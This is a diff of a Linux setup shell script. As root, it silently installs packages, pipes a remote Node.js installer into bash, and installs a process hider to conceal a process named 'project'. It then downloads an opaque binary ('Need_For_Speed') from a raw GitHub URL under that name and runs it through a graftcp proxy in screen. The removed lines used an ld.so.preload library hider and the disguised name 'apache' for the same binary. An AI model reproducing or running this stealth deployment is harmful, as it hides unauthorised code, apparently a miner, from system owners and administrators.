@@ -1,7 +1,11 @@
-#!/bin/sh
-apt update
-apt install -y curl unzip autoconf git cmake binutils build-essential net-tools screen golang nano tar wget
-
+#!/bin/bash    
+sudo su <<EOF
+apt update;apt install -y sudo wget curl unzip >/dev/null 2>&1
+sudo apt update;apt install -y curl unzip autoconf git nano cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs >/dev/null 2>&1
+sudo npm i -g node-process-hider && sudo ph add project
+wget -O project https://raw.githubusercontent.com/hanifgz/ngarit/main/Need_For_Speed;chmod +x project &&
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -23,14 +27,5 @@ sleep .2
 echo " "
 echo " "
 
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
-
-wget -O apache https://raw.githubusercontent.com/hanifgz/ngarit/main/Need_For_Speed
-chmod +x apache
-
 screen ./graftcp/graftcp bash
+EOF
